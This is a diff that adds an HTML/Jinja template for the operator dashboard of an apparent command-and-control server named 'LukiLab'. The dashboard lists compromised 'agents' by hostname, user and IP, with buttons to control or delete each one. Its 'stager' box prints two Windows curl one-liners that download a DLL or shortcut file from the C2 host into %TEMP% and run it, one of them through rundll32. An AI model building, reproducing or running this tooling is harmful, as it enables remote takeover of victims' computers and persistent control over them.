@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>LukiLab - agents</title>
+<style>
+:root { --red: #e74c3c; --red-b: #ff4444; --red-d: #8b0000; --bg: #0d0d0d; --surface: #1a1a1a; --border: #2a2a2a; --text: #e0e0e0; --dim: #888; }
+* { margin:0; padding:0; box-sizing:border-box; }
+body {
+  font-family: 'Segoe UI', system-ui, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  font-size: 15px;
+}
+pre, code, .mono { font-family: 'Consolas', 'Courier New', monospace; }
+.header {
+  border-bottom: 1px solid var(--border);
+  padding: 16px 32px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  background: var(--surface);
+}
+.header .logo { font-weight: 700; font-size: 18px; letter-spacing: 1px; }
+.header .logo em { font-style: normal; color: var(--red); }
+.header a { color: var(--dim); text-decoration: none; font-size: 13px; transition: color .2s; }
+.header a:hover { color: var(--red); }
+.container { padding: 32px; max-width: 1600px; margin: 0 auto; }
+h2 {
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--dim);
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  margin-bottom: 20px;
+  padding-bottom: 10px;
+  border-bottom: 1px solid var(--border);
+}
+h2 em { font-style: normal; color: var(--text); }
+table { width: 100%; border-collapse: collapse; }
+th {
+  text-align: left;
+  padding: 10px 16px;
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--dim);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  border-bottom: 1px solid var(--border);
+}
+td {
+  padding: 12px 16px;
+  border-bottom: 1px solid #1a1a1a;
+  vertical-align: middle;
+  font-size: 14px;
+}
+tr:hover td { background: #121212; }
+.thost { font-weight: 600; font-size: 15px; }
+.tid { color: var(--dim); font-size: 12px; font-family: 'Consolas', monospace; }
+.tstat {
+  display: inline-block;
+  padding: 3px 10px;
+  font-size: 11px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  font-family: 'Consolas', monospace;
+}
+.tstat.alive { color: var(--red); border: 1px solid var(--red-d); }
+.tstat.dead { color: #555; border: 1px solid #333; }
+a.btn {
+  display: inline-block;
+  padding: 5px 16px;
+  border: 1px solid var(--red-d);
+  color: var(--red);
+  text-decoration: none;
+  font-size: 12px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  transition: background .2s, color .2s;
+}
+a.btn:hover { background: var(--red); color: #fff; }
+.btn-del {
+  background: transparent;
+  border: 1px solid #500;
+  color: var(--red-d);
+  font-size: 11px;
+  padding: 3px 10px;
+  cursor: pointer;
+  transition: background .2s, color .2s;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+.btn-del:hover { background: var(--red); color: #fff; border-color: var(--red); }
+.box {
+  margin-top: 32px;
+  border: 1px solid var(--border);
+  padding: 20px;
+}
+.box h3 { font-size: 12px; font-weight: 600; color: var(--red); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 14px; }
+.box code {
+  display: block;
+  padding: 10px 12px;
+  margin-bottom: 8px;
+  background: #080808;
+  border: 1px solid #1a1a1a;
+  font-size: 13px;
+  color: var(--text);
+  word-break: break-all;
+  font-family: 'Consolas', monospace;
+  line-height: 1.5;
+}
+.note { font-size: 12px; color: var(--dim); margin-top: 8px; }
+.empty { color: var(--dim); text-align: center; padding: 48px 0; font-size: 14px; }
+</style>
+</head>
+<body>
+<div class="header">
+<div class="logo">[ <em>LukiLab</em> ] agents</div>
+<a href="/lukilab/logout">logout</a>
+</div>
+<div class="container">
+<h2>registered agents <em>({{ agents|length }})</em></h2>
+<table>
+<thead>
+<tr><th>id</th><th>hostname</th><th>user</th><th>ip</th><th>status</th><th>last seen</th><th></th></tr>
+</thead>
+<tbody>
+{% for a in agents %}
+<tr>
+<td class="tid">{{ a.id[:8] }}..</td>
+<td class="thost">{{ a.hostname or '?' }}</td>
+<td>{{ a.username or '?' }}</td>
+<td>{{ a.ip or '?' }}</td>
+<td><span class="tstat {{ a.status }}">{{ a.status }}</span></td>
+<td class="mono">{{ a.last_seen.strftime('%H:%M:%S') if a.last_seen else '--' }}</td>
+<td>
+<a class="btn" href="/lukilab/agent/{{ a.id }}">control</a>
+<form method="POST" action="/lukilab/agent/{{ a.id }}/delete" style="display:inline" onsubmit="return confirm('delete agent {{ a.id[:8] }} and all tasks?')">
+<button class="btn-del" type="submit">x</button>
+</form>
+</td>
+</tr>
+{% else %}
+<tr><td colspan="7" class="empty">no agents registered</td></tr>
+{% endfor %}
+</tbody>
+</table>
+
+<div class="box">
+<h3>stager</h3>
+<code>curl -s -o %TEMP%/d.dll {{ c2 }}/api/stager/dll && rundll32 %TEMP%/d.dll,RunDllEntry</code>
+<code>ping 127.0.0.1 -n 6 >nul && curl -s -o %TEMP%/u.lnk {{ c2 }}/stager.lnk && %TEMP%/u.lnk</code>
+<div class="note">no auth required — dll has embedded api key</div>
+</div>
+</div>
+</body>
+</html>
